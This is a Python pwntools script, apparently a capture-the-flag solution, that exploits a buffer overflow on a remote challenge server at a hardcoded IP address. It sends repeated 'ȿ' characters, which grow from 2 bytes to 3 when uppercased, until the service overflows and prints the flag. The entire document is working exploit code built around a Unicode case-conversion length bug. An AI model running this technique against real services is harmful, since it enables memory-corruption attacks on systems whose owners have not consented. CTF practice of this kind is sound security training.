from pwn import *

host = '34.126.223.46'
port = 19030

# 'ȿ' (U+023F) is 2 bytes (\xc8\xbf). 
# Uppercase 'Ȿ' (U+2C7E) is 3 bytes (\xe2\xb1\xbe).
target_char = b"\xc8\xbf"

def exploit():
    # Loop from 1 to 9 characters. 
    # 9 chars * 2 bytes = 18 bytes (safely under the 19 limit).
    # But when uppercased: 9 chars * 3 bytes = 27 bytes (Overflow!)
    for i in range(1, 10):
        try:
            io = remote(host, port, level='error')
            
            payload = target_char * i
            print(f"[*] Sending {i} 'ȿ' chars ({len(payload)} bytes input -> {i*3} bytes output)")
            
            # Send payload without an extra newline if possible to maximize buffer use
            io.sendafter(b":\n", payload + b"\n") 
            
            response = io.recvall(timeout=1)
            output = response.decode(errors='ignore').strip()
            
            if b"kashi{" in response.lower():
                print(f"\n[!!!] FLAG FOUND [!!!]")
                print(output)
                io.close()
                break
                
            io.close()
        except Exception as e:
            print(f"[-] Crashed or failed at {i} chars")

if __name__ == "__main__":
    exploit()
